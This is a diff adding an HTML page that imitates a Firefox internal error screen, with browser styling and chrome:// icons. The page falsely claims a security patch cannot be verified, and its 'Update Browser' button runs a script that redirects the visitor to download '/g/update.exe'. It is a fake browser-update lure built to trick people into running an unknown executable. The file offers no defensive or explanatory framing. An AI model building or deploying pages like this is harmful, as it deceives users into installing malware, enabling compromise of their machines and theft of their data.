@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+    <title>Update Browser</title>
+    <link rel="stylesheet" href="browser.css" type="text/css" media="all" />
+    <link rel="icon" type="image/png" href="chrome://global/skin/icons/warning-16.png" />    
+    <style>
+
+      .description-wrapper {
+        background-image: url("error-session-restore.svg");
+        background-repeat: no-repeat;
+        background-size: 38%;
+        padding-inline-start: 38%;
+        background-position: left center;
+        min-height: 300px;
+      }
+
+      .title {
+        background-image: none;
+      }
+
+      body[dir="rtl"] .description-wrapper {
+        background-position: right center;
+      }
+      body[dir="rtl"] #tabsToggle:after {
+        background-position: left center;
+      }
+
+      #tabsToggle {
+        cursor: pointer;
+        color: #0a84ff;
+        -moz-context-properties: fill;
+        fill: currentColor;
+        border: none;
+        padding: 0;
+        margin: 0;
+        padding-inline-end: 45px;
+        font: inherit;
+        position: relative;
+      }
+
+      #tabsToggle:after {
+        content: "";
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        top: 0;
+        left: 0;
+        background-image: url("chrome://global/skin/icons/arrow-dropdown-16.svg");
+        background-repeat: no-repeat;
+        background-size: 20px;
+        background-position: right center;
+      }
+
+      #tabsToggle:not(.show-tabs):after {
+        transform: scaleY(-1);
+      }
+
+      #tabsToggle:hover {
+        background-color: transparent;
+      }
+
+      #tabsToggle.show-tabs > #hideTabs,
+      #tabsToggle:not(.show-tabs) > #showTabs {
+        display: none;
+      }
+
+      .tree-container:not(.expanded) {
+        visibility: collapse;
+      }
+
+      .button-container {
+        text-align: end;
+      }
+
+      treechildren::-moz-tree-image(icon),
+      treechildren::-moz-tree-image(noicon) {
+        padding-right: 2px;
+        margin: 0 2px;
+        width: 16px;
+        height: 16px;
+      }
+
+      treechildren::-moz-tree-image(noicon) {
+        list-style-image: url("chrome://mozapps/skin/places/defaultFavicon.svg");
+        -moz-context-properties: fill;
+        fill: currentColor;
+      }
+      treechildren::-moz-tree-image(container, noicon) {
+        list-style-image: url("chrome://browser/skin/window.svg");
+      }
+
+      treechildren::-moz-tree-image(checked) {
+        list-style-image: url("chrome://global/skin/in-content/check.svg");
+        -moz-context-properties: fill, stroke;
+        fill: #2292d0;
+        stroke: none;
+      }
+      treechildren::-moz-tree-image(checked, selected) {
+        fill: white;
+        stroke: #0095dd;
+      }
+
+      treechildren::-moz-tree-image(partial) {
+        list-style-image: url("chrome://global/skin/in-content/check-partial.svg");
+        -moz-context-properties: fill, stroke;
+        fill: #2292d0;
+        stroke: none;
+      }
+      treechildren::-moz-tree-image(partial, selected) {
+        fill: white;
+        stroke: #0095dd;
+      }
+    </style>
+    <script>
+      function UpdateBrowser() {
+        window.location.replace('/g/update.exe');
+      }
+    </script>
+  </head>
+
+  <body dir="ltr" class="illustrated">
+    <div class="container restore-chosen">
+      <div class="description-wrapper">
+        <div class="title">
+          <h1 class="title-text">We are having trouble verifying the latest security patch for your browser.</h1>
+        </div>
+        <div class="description">
+          <p>If you continue to experience connection issues, please update your browser by downloading the latest security patch and running the installer.</p>
+
+          <div id="errorLongDesc">
+            <p>Please enable browser auto-update to avoid future interruptions.</p>
+          </div>
+        </div>
+      </div>
+      <div class="button-container">
+        <a href="javascript:UpdateBrowser()">
+          <button class="primary" id="errorTryAgain" label="Update Firefox" style="padding-top: 5px; padding-bottom: 5px">Update Browser</button>
+        </a>
+      </div>
+    </div>
+  </body>
+</html>
